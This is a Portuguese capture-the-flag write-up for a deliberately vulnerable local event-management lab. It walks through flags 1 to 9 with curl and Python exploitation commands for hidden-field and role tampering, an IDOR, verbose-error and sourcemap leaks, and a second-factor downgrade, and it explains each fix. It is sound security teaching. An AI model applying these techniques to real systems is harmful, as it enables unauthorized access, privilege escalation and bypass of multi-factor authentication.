# Writeup do Atrium — as 23 flags

Este guia explica o caminho de cada flag: a pista na interface, a falha no
código, um exemplo de exploração e o motivo de ela funcionar. Os valores foram
abreviados como `OCEAN{NN-...}`; use os que encontrar na sua instância.

## Preparar os exemplos

Suba uma variante seguindo o [COMO-SUBIR.md](COMO-SUBIR.md). Os comandos deste
writeup usam Bash, `curl` e, em alguns exemplos, Python 3 e OpenSSL. No Windows,
use um terminal Bash, como o do WSL. Essas ferramentas são para os exemplos;
para iniciar o laboratório, basta o Docker.

```bash
export ATR=http://127.0.0.1:8000
export JAR="$PWD/cookies.txt"
```

Ajuste a porta se necessário. `$JAR` é o arquivo de cookies que guarda a sessão
usada nos exemplos. Substitua os valores entre `<...>` antes de executar os
comandos. As respostas mostradas são exemplos abreviados.

Os [códigos de cadastro](COMO-SUBIR.md#cadastro) são os das imagens deste pacote.
As flags e os códigos da instância usada na avaliação eram outros.

Para conferir a variante e os mecanismos da imagem em execução:

```bash
docker logs atrium
```

Procure o evento `INSTANCIA_PRONTA`, com os campos `variante` e `eixos`.
A variante muda a localização de algumas falhas e o nome de alguns campos.
A semente muda os mecanismos das flags 16, 17, 19 e 21. Cada seção indica o que
usar nas imagens deste pacote.

Alguns exercícios alteram contas, sessões, lotes e ingressos. Para repetir um
percurso com o estado inicial, remova o contêiner e crie outro, como descrito em
[Zerar ou trocar de variante](COMO-SUBIR.md#zerar-ou-trocar-de-variante).

## Ordem de resolução

A numeração identifica as flags; ela não é uma sequência obrigatória.
A flag 8 permite virar organizador, e a 7 permite refazer o login nesse papel.
Só então ficam acessíveis as flags 5, 12, 20 e 21. A flag 22 exige as credenciais
obtidas na 12 e o segundo fator exposto na 11.

A final usa os fragmentos das flags **5, 8, 12, 15 e 22**. Guarde esses valores
quando aparecerem. O procedimento obtido na flag 22 explica como combiná-los.

---

## Flag 1 — o campo a mais no `security.txt`

**Classe:** Info Disclosure / Misconfiguration · **1 ponto** · sem sessão

### A falha

Alguém deixou um campo não padronizado no `/.well-known/security.txt`:

```
Flag-1: <base64>
# campo interno de conferência do time de plataforma
```

O `security.txt` é um arquivo público por definição — é o endereço em que
qualquer pessoa procura como reportar uma vulnerabilidade. Neste laboratório,
um campo interno foi incluído nesse arquivo público e expõe a flag.

### O convite

Nenhum. Esta é a única flag da prova em que a chegada é convenção pura: a
RFC 9116 define o caminho `/.well-known/security.txt`, e nada na aplicação
aponta para ele. O `/robots.txt` não referencia o arquivo.

O exercício vale 1 ponto e pede o reconhecimento desse caminho conhecido.
Na avaliação, ferramentas de varredura de diretórios estavam fora do escopo;
bastava consultar o endereço diretamente.

### O percurso

```bash
curl -s $ATR/.well-known/security.txt
curl -s $ATR/.well-known/security.txt | awk '/^Flag-1:/{print $2}' | base64 -d; echo
```

### Por que funciona

O exercício é de reconhecimento por convenção: consultar um endereço conhecido,
mesmo que a interface não tenha um link para ele. Outros caminhos comuns, como
`/robots.txt`, `/sitemap.xml` e `/status`, também podem dar pistas. Eles não estão
presentes em todo site, nem seguem todos a mesma norma.

O base64 não é criptografia: é codificação. A confusão entre as duas aparece com
frequência em achados reais — o valor está em texto claro, só não está legível a
olho nu.

### Rabbit hole vizinho

Existe um `/security.txt` na raiz do site. Ele não tem flag: traz só contato e
diz que não é o local canônico e não recebe mais atualizações — sem nomear onde fica o certo.

---

## Flag 2 — o plano que a interface não mostra

**Classe:** Parameter Tampering · **3 pontos** · sem sessão · **varia por variante**

### A falha

O formulário de cadastro manda um campo que a interface não renderiza, com valor
fixo `free`:

```html
<input type="hidden" name="plan" value="free">
```

O servidor lê esse campo direto do corpo da requisição e aceita qualquer valor
que o cliente mandar. Quando o valor é `trial`, a resposta entrega a flag — **em
base64, dentro do cookie `atr_tier`, nunca no corpo**.

O nome do campo muda por variante:

| Variante | Campo do plano | Variante | Campo do plano |
|:--:|---|:--:|---|
| A | `plan` | E | `billing_mode` |
| B | `tier` | F | `plano` |
| C | `billing_mode` | G | `plan` |
| D | `plano` | H | `tier` |

Mandar o nome errado não dá erro: o servidor simplesmente usa o padrão `free` e
segue. Se você testou `plan` numa instância B, recebeu um 201 perfeitamente
normal e concluiu que não havia nada ali.

### O convite

A página pública `/planos` lista três faixas — Grátis, Trial e Empresarial — e o
cartão do Trial traz o selo "por convite" e a nota *"Trial disponível para
organizações convidadas"*. Ou seja: o plano existe, e não aparece no
`/cadastro`.

Essa é a pergunta que abre a flag: *se o Trial existe e o formulário não oferece,
como o servidor sabe qual plano eu pedi?* A resposta está no código-fonte da
página de cadastro (ou na requisição, vista no proxy): o campo está lá, oculto,
já preenchido.

### O percurso

1. Ler `/planos` e notar o Trial ausente do `/cadastro`.
2. Ver o HTML do `/cadastro` e achar o campo oculto — ou capturar a requisição
   no proxy, que dá o mesmo.
3. Reenviar o cadastro com o valor `trial`.
4. **Olhar os cabeçalhos da resposta 201.**

```bash
curl -s -D- -o /dev/null -X POST $ATR/api/auth/cadastro \
  -H 'content-type: application/json' \
  -d '{"nome":"Ana Teste","email":"ana@example.test","senha":"senha-comprida-1",
       "codigo_cadastro":"ATRIUM-3FA145","plan":"trial"}'
```

```bash
# o mesmo, já decodificando o cookie (note o `tr -d '"'`: o valor vem entre aspas)
curl -s -D- -o /dev/null -X POST $ATR/api/auth/cadastro \
  -H 'content-type: application/json' \
  -d '{"nome":"Bia Teste","email":"bia@example.test","senha":"senha-comprida-1",
       "codigo_cadastro":"ATRIUM-3FA145","plan":"trial"}' \
  | grep -i '^set-cookie: atr_tier=' | sed -e 's/^[^=]*=//' -e 's/;.*//' | tr -d '"' \
  | base64 -d; echo
```

Para achar o campo oculto sem abrir o navegador:

```bash
curl -s $ATR/cadastro | grep -i 'type="hidden"'
```

### Por que funciona

Duas lições diferentes.

A primeira é *parameter tampering* clássico: **um campo oculto não é um campo
protegido**. `type="hidden"` é uma instrução de renderização para o navegador,
não um controle de segurança. Quem controla o corpo da requisição — e o usuário
sempre controla — escolhe o valor. A correção não é "esconder melhor": é o
servidor decidir o plano a partir de algo que ele conhece (a organização, um
convite, um registro comercial), e ignorar o que o cliente sugere.

A segunda é sobre **onde procurar o achado**. O corpo da resposta diz:

```json
{
  "status": "criado",
  "papel": "participante",
  "plano": "free",
  "nota": "plano 'trial' registrado para conferência comercial; sem efeito funcional nesta conta — a faixa acompanha a sessão desta requisição"
}
```

Lido rápido, isso parece um beco sem saída: *"achei o campo certo, o servidor
aceitou, e não mudou nada — então não há flag aqui"*. Lido com atenção, a frase
aponta exatamente para onde olhar: *a faixa acompanha a sessão desta
requisição*. Estado que acompanha a sessão de uma requisição HTTP mora em
cabeçalho — em `Set-Cookie`, neste caso.

O hábito que essa flag ensina é simples e vale para o resto da carreira:
**resposta é corpo + cabeçalhos + código de status**. Quem trabalha só com o
JSON renderizado pelo cliente vê metade da resposta.

---

## Flag 3 — o sourcemap entrega um endpoint não linkado

**Classe:** Info Disclosure / Misconfiguration · **2 pontos** · sem sessão

### A falha

O bundle de produção `/static/app.js` termina com a linha que aponta o
sourcemap, e o sourcemap **é servido**:

```
//# sourceMappingURL=/static/app.js.map
```

O arquivo `.map` carrega o código-fonte original, inclusive de um módulo de
pré-visualização que nenhuma tela do sistema linka. Esse módulo nomeia
`GET /api/preview/render`, um endpoint interno que responde sem sessão e devolve
a flag no campo `preview_token`.

### O convite

A última linha do `/static/app.js`. Só isso — mas é uma linha que está em todas
as páginas do site.

### O percurso

```bash
curl -s $ATR/static/app.js | tail -1
curl -s $ATR/static/app.js.map | python3 -m json.tool | grep -i -A20 preview
curl -s "$ATR/api/preview/render?template=cracha-padrao"
```

O que sai do sourcemap:

```js
// src/modules/preview.js — pré-visualização de crachá (uso interno)
//
// O endpoint de render não é exposto na navegação: ele é chamado direto pelo
// editor de modelos e pelo job de impressão em lote.
//
// TODO(plataforma): mover para trás do gateway antes do próximo release.
// Hoje ele responde sem sessão, e o time de conteúdo depende disso para
// pré-visualizar modelos a partir do ambiente de homologação.

const PREVIEW_ENDPOINT = "/api/preview/render";
```

### Por que funciona

O sourcemap relaciona o código distribuído ao código original para facilitar a
depuração. Neste caso, ele também inclui o fonte comentado, nomes de variáveis
e a referência ao endpoint de pré-visualização.

Publicar um sourcemap, por si só, não cria essa falha de autorização. O problema
é o endpoint `/api/preview/render` aceitar a chamada sem verificar o acesso.
O mapa apenas revela onde ele está. O comentário sobre movê-lo para trás do
gateway é uma pista para investigar essa ausência de controle.

### A ligação que vale ponto

O mesmo sourcemap comenta outra coisa:

```js
export function diagnostico() {
  // o painel de status aceita ?verbose=1 e lista o ambiente resolvido,
  // útil para conferir qual build está no ar
  return fetch("/status?verbose=1").then((r) => r.json());
}
```

Essa referência leva à flag 4. O sourcemap dá acesso a duas pistas: o endpoint
de pré-visualização e o diagnóstico de status. 

---

## Flag 4 — o mascaramento que corta pelo tamanho errado

**Classe:** Info Disclosure / Misconfiguration · **1 ponto** · sem sessão

### A falha

`/status?verbose=1` lista variáveis de ambiente "mascaradas". A função de
mascaramento é esta:

```python
def _mascarar(v: str) -> str:
    # preserva início e fim; valores curtos passam inteiros
    return v if len(v) < 24 else v[:4] + "…" + v[-4:]
```

Duas decisões erradas na mesma linha: o mascaramento só se aplica acima de um
limiar de tamanho, e quando se aplica preserva início e fim. Uma flag tem 22
caracteres (`OCEAN{` + 2 + `-` + 12 + `}`), abaixo do limiar de 24 — e sai
inteira em `ATR_RECOVERY_PIN`.

### O convite

O `/status` está linkado no rodapé do site. O `?verbose=1` veio do sourcemap da
flag 3.

### O percurso

```bash
curl -s "$ATR/status?verbose=1" | python3 -m json.tool
```

```json
{
  "ambiente": {
    "ATR_ENV": "producao",
    "ATR_DB_URL": "sqli…m.db",
    "ATR_SMTP_RELAY": "smtp…:587",
    "ATR_WEBHOOK_SIGNING_KEY": "4ANU…CSY4",
    "ATR_SESSION_PEPPER": "9f14…9a55",
    "ATR_RECOVERY_PIN": "OCEAN{04-...}"
  },
  "nota": "valores sensíveis são mascarados nesta saída"
}
```

### Por que funciona

Esta é uma flag de 1 ponto que separa leitura de análise.

"Havia uma variável exposta" é leitura. **"O mascaramento tem um limiar de
tamanho, e segredos curtos passam inteiros"** é análise — e a prova está na
própria resposta: a chave de assinatura de webhook (32 caracteres) e o pepper de
sessão (36) *foram* mascarados, lado a lado, na mesma saída. É esse contraste
que demonstra a regra e permite reconhecer um defeito reproduzível.

O segundo defeito é mais sutil e vale mencionar: mesmo quando mascara,
`v[:4] + "…" + v[-4:]` preserva 8 caracteres reais. Para um segredo de alta
entropia isso é pouco; para um valor estruturado (um token com prefixo
conhecido, um identificador com sufixo previsível) pode ser o suficiente para
reconstruir ou reconhecer o valor. Mascaramento que preserva as pontas existe
para *humanos conferirem* qual chave está em uso, não para proteger o segredo —
e quando o segredo não devia estar na tela de jeito nenhum, mascarar é remendo,
não correção.

O terceiro ponto: a nota diz *"valores sensíveis são mascarados nesta saída"*.
Ela está errada, e a resposta se contradiz na mesma tela. Afirmação de segurança
feita pela própria aplicação é hipótese a testar, nunca garantia.

---

## Flag 5 — o erro de importação vaza mais do que a flag

**Classe:** Info Disclosure / Misconfiguration · **3 pontos** · exige organizador
> **Você chega aqui depois.** Esta tela é do painel do organizador: é preciso ter
> feito a flag 8 (virar organizador) e a flag 7 (conseguir logar de novo). Resolva
> essas duas etapas e volte a esta seção.

### A falha

`POST /api/organizador/convidados/importar` espera um CSV. Quando recebe
qualquer coisa que não seja CSV válido, devolve 422 com um diagnóstico de
desenvolvedor completo:

```json
{
  "erro": "arquivo_invalido",
  "mensagem": "não foi possível interpretar o arquivo enviado; esperado CSV com cabeçalho 'nome,email,empresa'",
  "arquivo_temporario": "/srv/atrium/var/import/<id-da-instância>/upload.csv",
  "parser": "atrium.importacao.csv:78",
  "lote_conciliacao_corrente": "rec-2026-04-xxx",
  "conciliacao_hint": "o lote acima é o identificador aceito pelo serviço de conciliação interno",
  "codigo_conformidade": "OCEAN{05-...}",
  "fragmento_cofre": "XXXXXX"
}
```

O diagnóstico inclui um caminho de arquivo, um identificador da instância, uma
referência ao parser, o lote de conciliação e a flag. Os detalhes de
infraestrutura dessa mensagem fazem parte do cenário simulado.

### O convite

A tela `/painel/convidados` tem importação de CSV. Basta mandar lixo. O reflexo
certo diante de qualquer importador é esse: antes de mandar o arquivo bem
formado, mande um mal formado e leia o que a aplicação responde.

### O percurso

Com a sessão de organizador no `$JAR`:

```bash
curl -sS -b "$JAR" -X POST "$ATR/api/organizador/convidados/importar" \
  -H 'content-type: text/csv' --data 'isto nao e um csv' | python3 -m json.tool
```

### Por que funciona

Mensagem de erro é superfície de ataque, e esta mostra as três camadas que um
erro verboso costuma vazar de uma vez:

- **Infraestrutura.** O caminho `/srv/atrium/var/import/<id>/upload.csv` ilustra
  a exposição de diretórios internos. Ele não identifica, sozinho, o usuário
  do sistema operacional nem demonstra que o arquivo existe.
- **Implementação.** `atrium.importacao.csv:78` simula uma referência interna
  de depuração. Ela orienta a investigação, mas não identifica uma biblioteca
  vulnerável ou uma CVE.
- **Negócio.** O `lote_conciliacao_corrente`.

### O item de valor não é a flag

Esta é a lição da flag 5, e é por isso que ela vale 3 pontos e não 1.

O `lote_conciliacao_corrente` reaparece muito mais tarde, como parâmetro
obrigatório `batch` no segundo estágio do SSRF (flag 22). A própria
resposta diz o que ele é: *"o lote acima é o identificador aceito pelo serviço
de conciliação interno"*.

A mensagem de erro revela um vazamento, e o lote permite iniciar uma cadeia de
exploração porque é aceito por um serviço interno. Na prática de pentest, isso
significa construir um inventário de material — identificadores,
nomes de host internos, credenciais parciais, formatos de token — que só faz
sentido três horas depois, quando aparece o endpoint que consome aquilo.

Anote tudo que a aplicação lhe der e que você não sabe usar ainda.

> O mesmo lote também sai pela flag 12 (SQL injection), na tabela
> `platform_secrets`. Quem pegou a 12 e não a 5 fecha a cadeia mesmo assim, por
> outro caminho.

---

## Flag 6 — IDOR pelo crachá público

**Classe:** Authentication e Access Control · **3 pontos** · sem sessão

### A falha

`GET /api/tickets/{ticket_id}` não verifica dono. Para qualquer identificador
válido — autenticado ou não — devolve observações internas, valor pago, canal de
aquisição, e-mail do titular e o UID do portador.

A flag está no campo `observacoes_internas` do ingresso de um participante VIP
do cenário.

### O convite

São duas metades, e a flag só aparece quando elas se encaixam. Essa é a
dificuldade real — nenhuma das duas, sozinha, parece um achado.

**A primeira metade é o endpoint.** Abra um ingresso seu em `/ingressos/TCK-…`
com o proxy ligado. A tela monta o bloco "Registro completo" chamando
`GET /api/tickets/<o seu>`, e o JSON traz mais campos do que a página desenha —
inclusive um `observacoes_internas` vazio. Um campo que existe na API e não
aparece na interface é um convite: significa que ele tem conteúdo em *algum*
registro.

**A segunda metade é o alvo.** A página pública `/presenca` lista quem confirmou
presença, com nome, cargo, cidade e link para o crachá público. Uma pessoa tem
o cargo **"Convidado institucional"**, que destoa de todos os outros cargos da
lista. O crachá dela dá o identificador do ingresso.

### O percurso

Trocar o identificador do primeiro pelo do segundo.

```bash
# achar o alvo pela anomalia de negócio na lista pública
TCK=$(curl -s $ATR/presenca | grep -A6 'Convidado institucional' \
      | grep -o 'TCK-[A-Z0-9]\{6\}' | head -1)
echo $TCK

# o endpoint não confere dono — nem exige sessão
curl -s $ATR/api/tickets/$TCK | python3 -m json.tool
```

### Por que funciona

IDOR (*Insecure Direct Object Reference*) é a falha em que o servidor usa o
identificador que o cliente manda para buscar o objeto, e esquece de perguntar
se aquele cliente pode ver aquele objeto. Aqui o `SELECT` busca por
`ticket_id` e o resultado é serializado sem nenhuma comparação entre
`sessao["id"]` e `i["dono_id"]`.

Três observações sobre o mecanismo e o impacto da falha:

**O caminho até o alvo foi um sinal de negócio, não enumeração.** Os ticket IDs
são `TCK-` mais 6 caracteres derivados da semente, de um alfabeto sem I, O, 0 e
1. Incrementar não leva a lugar nenhum — o espaço é grande e não é sequencial. O
caminho é percorrer referências públicas: a lista de presença publica os
identificadores de graça. "Enumerei tickets" e "segui as referências que a
aplicação publica" são metodologias diferentes, e a segunda é a que funcionou.

**A falha é a ausência de verificação de propriedade no endpoint, não a
existência do crachá público.** O crachá expõe só o que o participante autorizou
divulgar (nome, cargo, cidade) — ele está correto. Confundir os dois leva a uma
recomendação errada ("remover a página de presença") em vez da certa ("comparar o
dono do recurso com o dono da sessão antes de responder").

**A escolha do alvo é o que transforma IDOR genérico em impacto demonstrável.**
Ler o ingresso de um participante qualquer prova a falha; ler o do convidado
institucional — cortesia aprovada pela diretoria, com observação interna — prova
o *impacto*. A gravidade depende dos dados expostos, de quem consegue acessá-los e das
consequências para o sistema avaliado.

---

## Flag 8 — o `papel` que a API aceita do cliente

**Classe:** Authentication e Access Control · **3 pontos** · exige participante
> **Resolve-se antes da flag 7.** A promoção que esta flag concede é o que cria a
> situação da 7 — e é o que destrava as flags 5, 12, 20 e 21.

Esta flag é **idêntica nas oito variantes**. O tipo de convite que falha é
`credenciamento` em todas.

### A falha

Existem dois caminhos para criar um convite de equipe, e eles não fazem a mesma
validação:

| Caminho | Quem usa | Valida o papel pedido? |
|---|---|:--:|
| `POST /painel/equipe/convites` | a tela do organizador | sim |
| `POST /api/team/invites` | a estação de credenciamento | **não, quando o `tipo` é `credenciamento`** |

No segundo caminho, o código é literalmente:

```python
tipo = str(corpo.get("tipo", runtime.VAR.convite_falho))
papel = str(corpo.get("papel") or corpo.get("role") or "credenciamento")
...
if tipo != runtime.VAR.convite_falho:
    if papel not in PAPEIS_PERMITIDOS:
        raise HTTPException(422, ...)
```

Quando o tipo é o que falha, a lista `PAPEIS_PERMITIDOS` nunca é consultada: o
`papel` vindo do cliente é gravado como veio. Aceitar o convite promove a conta.

### O convite

Três sinais, em sequência:

1. A área do participante tem o botão **"Quero ser voluntário"**, e a `/ajuda`
   confirma que a equipe de credenciamento aceita voluntários. É o caminho
   legítimo — e o papel, nesse caminho, é decidido pelo servidor.
2. Aceito o convite, a barra lateral ganha **Credenciamento → Equipe da
   estação**. Esse formulário tem dois `select`, e neles há opções
   **desabilitadas**: o tipo "Co-organizador do evento", e os papéis
   "Organizador" e "Operador da plataforma", com a legenda *"concedido pelo
   suporte"*.
3. Opção desabilitada é decisão da interface. A pergunta certa é: *o servidor
   repete essa checagem?*

Um `<option disabled>` some com um atributo removido no inspetor, ou
simplesmente não existe quando você monta a requisição à mão. É exatamente a
mesma lição do campo oculto da flag 2, um nível acima: **a interface descreve a
política, o servidor é que a aplica — ou não.**

### O percurso

Do zero, com uma conta nova. (Os exemplos usam a variante A; troque o código de
cadastro pelo da sua.)

```bash
# 0) conta de participante + sessão
curl -s -X POST $ATR/api/auth/cadastro -H 'content-type: application/json' \
  -d '{"nome":"Ana Teste","email":"ana@example.test","senha":"senha-comprida-1",
       "codigo_cadastro":"ATRIUM-3FA145"}'

CHAL=$(curl -s -X POST $ATR/api/auth/login -H 'content-type: application/json' \
  -d '{"email":"ana@example.test","senha":"senha-comprida-1"}' \
  | python3 -c 'import sys,json;print(json.load(sys.stdin)["challenge"])')

curl -s -c "$JAR" -X POST $ATR/api/auth/session/finalize \
  -H 'content-type: application/json' \
  -d "{\"challenge\":\"$CHAL\",\"factors\":[\"password\"]}"
```

```bash
# 1) caminho legítimo: virar voluntário (o servidor define papel=credenciamento)
TOK=$(curl -s -b "$JAR" -X POST $ATR/api/equipe/voluntario \
      | python3 -c 'import sys,json;print(json.load(sys.stdin)["token"])')

# 2) aceitar — a conta vira `credenciamento` e ganha a Equipe da estação
curl -s -b "$JAR" -X POST $ATR/api/team/invites/$TOK/aceitar
```

```bash
# 3) o formulário da estação manda isto (capture no proxy para conferir):
#    {"email":"...","tipo":"credenciamento","papel":"credenciamento"}
# 4) no Repeater, troque só o `papel`:
TOK2=$(curl -s -b "$JAR" -X POST $ATR/api/team/invites \
  -H 'content-type: application/json' \
  -d '{"email":"ana@example.test","tipo":"credenciamento","papel":"organizador"}' \
  | python3 -c 'import sys,json;print(json.load(sys.stdin)["token"])')

# 5) aceitar o convite forjado
curl -s -b "$JAR" -X POST $ATR/api/team/invites/$TOK2/aceitar | python3 -m json.tool
```

A resposta do passo 5 traz a flag, o fragmento do cofre (guarde: ele é material
da flag final) e o aviso que abre a próxima seção:

```json
{
  "status": "aceito",
  "papel": "organizador",
  "uid": "U-...",
  "codigo_conformidade": {
    "flag": "OCEAN{08-...}",
    "fragmento_cofre": "XXXXXX"
  },
  "aviso": "Papel alterado: as sessões anteriores foram encerradas e esta conta passou a exigir segundo fator. Autentique-se novamente em POST /api/auth/login.",
  "proximo_passo": "/api/auth/login"
}
```

Dois detalhes do mecanismo que valem conhecer: o `tipo` tem como **valor padrão**
justamente o tipo que falha (omitir o campo funciona igual), e o `papel` é lido
de `papel` **ou** de `role` — dois nomes para o mesmo campo, o que costuma
indicar refatoração incompleta e é um cheiro típico de validação duplicada mal
feita.

### Por que funciona

A falha não é "o campo `papel` era editável" — todo campo que trafega é
editável. A falha é a **assimetria entre dois caminhos que fazem a mesma coisa**.

Compare os controles de acesso de todos os caminhos que alteram o mesmo
recurso. Neste caso, a rota do organizador valida o papel, mas a API da estação
de credenciamento aceita o papel enviado pelo cliente para um tipo de convite.

Os dois caminhos gravam no mesmo lugar, mas aplicam controles diferentes.

### Os dois limites da falha

**A API recusa `operador`**, mesmo pelo caminho falho:

```bash
curl -s -b "$JAR" -X POST $ATR/api/team/invites -H 'content-type: application/json' \
  -d '{"email":"ana@example.test","tipo":"credenciamento","papel":"operador"}'
# {"erro":"papel_nao_permitido",
#  "mensagem":"convites de equipe não concedem acesso de plataforma;
#              contas de operação são provisionadas pelo suporte", ...}
```

Há um teto explícito no código (`PAPEL_MAXIMO_FORJAVEL = "organizador"`). Testar
esse limite permite medir o alcance da falha: a escalada chega a organizador,
mas não concede acesso de operador da plataforma.

**O convite de co-organizador é rabbit hole.** Forjar papel por aquele tipo
devolve 422:

```json
{
  "erro": "papel_nao_permitido",
  "permitidos": [
    "credenciamento"
  ],
  "tipo_avaliado": "coorganizador",
  "mensagem": "a política de papéis é avaliada por tipo de convite; convites deste tipo concedem apenas os papéis listados"
}
```

Leia a mensagem com cuidado: ela diz que a política é avaliada **por tipo de
convite**. A recusa vale para o tipo escolhido. O formulário oferece outro tipo,
que pode ter uma validação diferente. Compare as respostas antes de descartar
o caminho.

**Rabbit hole vizinho:** `PATCH /api/perfil` com `{"papel":"operador"}` responde
`200 atualizado` e ignora o campo em silêncio. Só olhando o perfil depois se
percebe. Testar mass assignment ali exige conferir o estado da conta depois da
requisição.

---

## Flag 7 — o downgrade do segundo fator

**Classe:** Authentication e Access Control · **4 pontos** · depende da flag 8

### A situação — que é o convite

Você acabou de virar organizador pela flag 8. A resposta avisou que as sessões
foram encerradas. Você refaz o login e recebe:

```json
{"step":"totp","challenge":"...","fatores_esperados":["password","totp"],
 "finalizar_em":"/api/auth/session/finalize"}
```

A conta agora exige um segundo fator que **você nunca cadastrou**. Não há tela de
provisionamento, não há QR code, não há código de recuperação. Parece
*soft-lock* — parece que você se trancou para fora ao explorar a falha anterior.

Não é. E a saída estava à vista antes: o login de participante já passava pelo
mesmo `/api/auth/session/finalize`, e quem observou aquele fluxo no proxy já viu
o formato do corpo.

### A falha

O login tem duas etapas. `POST /api/auth/login` confere a senha e devolve um
`challenge`; `POST /api/auth/session/finalize` cria a sessão. E o `finalize`
decide a política de MFA a partir de uma lista que **o cliente manda**:

```python
fatores = corpo.get("factors") or corpo.get("fatores") or []
...
if "totp" in fatores:
    # ... confere o código de verdade, e recusa se estiver errado
elif u["exige_totp"]:
    # a conta exige segundo fator e a lista de fatores não o traz.
    # deveria recusar aqui — e não recusa.
    applog.evento("MFA_DOWNGRADE", ...)
    entregou = flags.entregar(7, ...)
```

O servidor sabe que a conta exige TOTP (`u["exige_totp"]`), registra que houve
downgrade — e cria a sessão assim mesmo.

### O percurso

```bash
# 1) novo desafio
CHAL=$(curl -s -X POST $ATR/api/auth/login -H 'content-type: application/json' \
  -d '{"email":"ana@example.test","senha":"senha-comprida-1"}' \
  | python3 -c 'import sys,json;print(json.load(sys.stdin)["challenge"])')

# 2) finalize OMITINDO o fator:
#    o que a interface manda:  {"challenge":"…","factors":["password","totp"],"totp_code":"…"}
#    o que o servidor aceita:  {"challenge":"…","factors":["password"]}
curl -s -c "$JAR" -X POST $ATR/api/auth/session/finalize \
  -H 'content-type: application/json' \
  -d "{\"challenge\":\"$CHAL\",\"factors\":[\"password\"]}" | python3 -m json.tool
```

```json
{"status":"sessao_criada","papel":"organizador","uid":"U-...",
 "fatores":["password"],
 "aviso_seguranca":"sessão criada sem o segundo fator exigido por esta conta",
 "codigo_conformidade":"OCEAN{07-...}"}
```

Sessão criada, papel de organizador intacto. A partir daqui o painel inteiro
está aberto — é esta sessão que você usa nas flags 5, 12, 20 e 21.

O `challenge` é consumido quando a sessão é criada, e vale 10 minutos.
Reaproveitar um já usado devolve `desafio_invalido`; se isso acontecer, peça
outro com um novo `POST /api/auth/login`. (Uma tentativa **recusada** não
consome o desafio: você pode testar `["password","totp"]` e depois
`["password"]` com o mesmo `challenge`, o que é justamente o experimento que
mostra a diferença entre os dois caminhos.)

### Por que funciona

**A lógica é invertida em relação ao reflexo.** O instinto de quem está preso
numa tela de TOTP é *forjar o código*: adivinhar seis dígitos, reusar um código
antigo, mandar `000000`. Nada disso funciona — declarar `["password","totp"]`
faz o servidor validar o TOTP de verdade e recusar com `totp_invalido`. O que
funciona é o contrário: **tirar o fator da lista**. O mecanismo é um downgrade
do segundo fator, sem forjar um código TOTP.

O ponto conceitual é o que vale os 4 pontos: **a política de MFA é decidida a
partir de um dado controlado pelo cliente, o que é o oposto de uma política.**
Uma política de autenticação existe justamente para não depender de quem se
autentica. O servidor tinha a informação certa em mãos (`exige_totp` no banco) e
mesmo assim consultou a lista do cliente para decidir o que exigir. A correção é
de uma linha conceitual: derive os fatores exigidos do registro da conta, e trate
a lista recebida como *o que o cliente alega ter apresentado* — nunca como *o que
ele precisa apresentar*.

E há um detalhe de arquitetura que explica por que o downgrade destrava o painel
inteiro, e não só a tela de login: **a checagem de segundo fator acontece uma vez
só, na criação da sessão.** As telas do organizador conferem papel e sessão
válida, não "esta sessão viu o segundo fator". Uma decisão de autenticação
tomada uma vez e carimbada num cookie vale por toda a vida daquele cookie — o
que é normal, e é exatamente o que torna o defeito no momento da decisão tão
caro.

### A conta de operação exige outro procedimento

Mais adiante (flags 12 e 22) você vai obter a credencial da conta de
**operador** e tentar o mesmo downgrade nela. **Não funciona**, por dois
motivos independentes:

**Primeiro motivo — a política daquela conta ignora a lista do cliente.** Existe
um caminho separado no mesmo arquivo:

```python
def _mfa_estrito(usuario) -> bool:
    """Nestas contas a lista `factors` enviada pelo cliente é ignorada: o
    servidor exige o segundo fator de qualquer jeito. É por isso que o
    downgrade da flag 7 funciona no organizador e não aqui."""
    return usuario["papel"] == "operador"
```

Omitir `totp` na conta de operador devolve 403:

```json
{
  "erro": "segundo_fator_obrigatorio",
  "mensagem": "Contas de plataforma exigem segundo fator. A política é aplicada no servidor e não depende dos fatores informados pelo cliente.",
  "fatores_exigidos": [
    "password",
    "totp"
  ]
}
```

Repare que essa mensagem **é a descrição da correção da flag 7**. A mesma
aplicação faz certo num lugar e errado no outro. Comparar os dois demonstra que
a falha está na *origem da decisão*, não no endpoint.

**Segundo motivo — o segundo fator daquela conta não usa os parâmetros
padrão.** Isto é o que travou mais gente, porque falha em silêncio e parece erro
de relógio ou de segredo. Na configuração do segundo fator dessa conta:

```python
# A conta de plataforma tem segundo fator com parâmetros fora do padrão. Quem
# copiar o segredo e rodar um gerador com os valores default recebe código
# recusado — os parâmetros estão na URI de provisionamento, e é preciso lê-los.
TOTP_OPERADOR = {"digitos": 8, "periodo": 45}
TOTP_PADRAO   = {"digitos": 6, "periodo": 30}
```

**8 dígitos, passo de 45 segundos.** Muitos geradores usam 6 dígitos e 30 segundos por padrão; os parâmetros
publicados por esta aplicação são diferentes.
E a conferência rejeita pelo tamanho antes mesmo de calcular qualquer coisa:

```python
if not informado.isdigit() or len(informado) != digitos:
    return False
```

Ou seja: com o segredo **correto** em mãos, um gerador com valores default
produz 6 dígitos, e 6 dígitos nunca serão aceitos onde se esperam 8. Você recebe
`totp_invalido` — a mesma mensagem de quem digitou o código errado. Nada na
resposta diz "o tamanho está errado", e é por isso que o sintoma engana: parece
segredo errado, parece relógio dessincronizado, parece que a credencial expirou.

Os parâmetros **estão publicados** na URI de provisionamento, que é o que a
aplicação entrega em `platformSettings.mfaProvisionamento` (flag 11):

```
otpauth://totp/Atrium:operacao%2B<...>%40eventosatrium.com
  ?secret=<BASE32>&issuer=Atrium&algorithm=SHA1&digits=8&period=45
```

`digits=8&period=45`. A própria aplicação lê a URI em vez de assumir o padrão
(`totp.parametros_da_uri`), e é isso que você tem de fazer também:

```bash
oathtool --totp -b --digits=8 --time-step-size=45s "<SEGREDO_BASE32>"
```

A lição é maior que o laboratório: **uma URI `otpauth://` não é só um segredo, é
uma configuração.** Ela carrega algoritmo, número de dígitos e período, e os três
podem não ser os padrões. Sempre que copiar um segredo TOTP de algum lugar,
copie os parâmetros junto — e, quando um código correto é recusado, desconfie do
formato antes de desconfiar do relógio.

---

## Flag 9 — a introspecção está ligada

`GraphQL` · 2 pontos · não exige sessão

**A falha.** O endpoint GraphQL responde a consultas de introspecção em
produção. Introspecção é o mecanismo pelo qual um servidor GraphQL descreve o
próprio schema: tipos, campos, argumentos e descrições. Com ela ligada, uma API
que deveria ser opaca vira um mapa completo — e o mapa mostra três campos de
raiz que nenhuma tela da aplicação usa: `internalAudit`, `platformSettings` e
`debugInfo`.

A descrição do tipo entrega o resto: *"Consulta de auditoria interna. Não é
usada por nenhuma tela"*. O campo `internalAudit.chaveConformidade` é a flag 9.

